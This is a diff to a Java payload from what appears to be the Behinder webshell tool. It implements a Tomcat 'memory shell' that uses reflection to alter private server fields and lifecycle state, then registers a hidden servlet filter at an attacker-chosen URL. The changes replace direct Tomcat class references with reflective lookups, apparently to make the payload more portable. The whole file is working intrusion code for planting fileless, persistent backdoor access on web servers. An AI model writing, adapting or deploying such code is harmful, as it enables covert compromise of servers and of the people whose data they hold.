@@ -1,8 +1,5 @@
 package net.rebeyond.behinder.payload.java.memoryshell;
 
-import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.StandardContext;
-
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.*;
@@ -36,26 +33,31 @@ public class Tomcat extends ClassLoader {
 
             Field field = servletContext.getClass().getDeclaredField("context");
             field.setAccessible(true);
-            ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
+            Object applicationContext = field.get(servletContext);
 
             field = applicationContext.getClass().getDeclaredField("context");
             field.setAccessible(true);
             Field modifiersField = Field.class.getDeclaredField("modifiers");
             modifiersField.setAccessible(true);
             modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
-            StandardContext standardContext = (StandardContext) field.get(applicationContext);
+            Object standardContext = field.get(applicationContext);
+
+            Object[] LifecycleStates = (Object[]) Class.forName("org.apache.catalina.LifecycleState").getMethod("values").invoke(null);
 
             String filterName = "filter"+System.currentTimeMillis();
             Filter filterShell = (Filter) new Tomcat(this.getClass().getClassLoader()).g(shellString.getBytes(StandardCharsets.ISO_8859_1)).newInstance();
+
             Field stateField = Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
             stateField.setAccessible(true);
-            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
-            javax.servlet.FilterRegistration.Dynamic filterRegistration = standardContext.getServletContext().addFilter(filterName, filterShell);
+//            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+            stateField.set(standardContext, LifecycleStates[3]);
+//            javax.servlet.FilterRegistration.Dynamic filterRegistration = standardContext.getServletContext().addFilter(filterName, filterShell);
+            javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName, filterShell);
             filterRegistration.setInitParameter("encoding", "utf-8");
             filterRegistration.setAsyncSupported(false);
             filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, urlPattern);
 
-            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+            stateField.set(standardContext, LifecycleStates[5]);
 
             Method filterStartMethod = standardContext.getClass().getMethod("filterStart");
             filterStartMethod.invoke(standardContext, null);
